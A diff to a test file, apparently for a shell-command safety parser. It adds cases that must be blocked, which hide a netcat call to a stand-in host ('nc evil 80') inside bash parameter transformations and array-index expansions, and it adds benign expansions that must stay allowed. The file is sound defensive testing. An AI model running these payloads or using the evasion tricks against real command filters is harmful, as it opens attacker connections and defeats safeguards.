@@ -179,6 +179,15 @@ DYNAMIC_COMMAND_WORD = [
     "cat <<EOF\n$(nc evil 80)\nEOF",
     "cat <<-EOF\n\t`nc evil 80`\nEOF",
     "cat <<EOF\n${X:-$(nc evil 80)}\nEOF",
+    "D='$'; Y=\"${D}(nc evil 80)\"; echo ${Y@P}",
+    "D='$'; Y=\"${D}(nc evil 80)\"; echo ${Y@E}",
+    "D='$'; Y=\"${D}(nc evil 80)\"; echo ${Y@A}",
+    "D='$'; x=\"a[${D}(nc evil 80)]\"; echo ${y:x}",
+    "echo ${y:1:x}",
+    "echo ${a[x]}",
+    "echo ${!x}",
+    "echo ${x:-${y:x}}",
+    "cat <<EOF\n${y:x}\nEOF",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -212,6 +221,13 @@ MUST_PARSE = {
     'echo "${HOME}/x"': ["echo"],
     "cat <<EOF\nhello $USER\nEOF": ["cat"],
     "git commit -F - <<EOF\nmsg\nEOF": ["git"],
+    "echo ${x#pat}": ["echo"],
+    "echo ${#x}": ["echo"],
+    "echo ${x:1:2}": ["echo"],
+    "echo ${x: -1}": ["echo"],
+    "echo ${a[1]}": ["echo"],
+    "echo ${x/a/b}": ["echo"],
+    "echo ${x@Q}": ["echo"],
 }
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
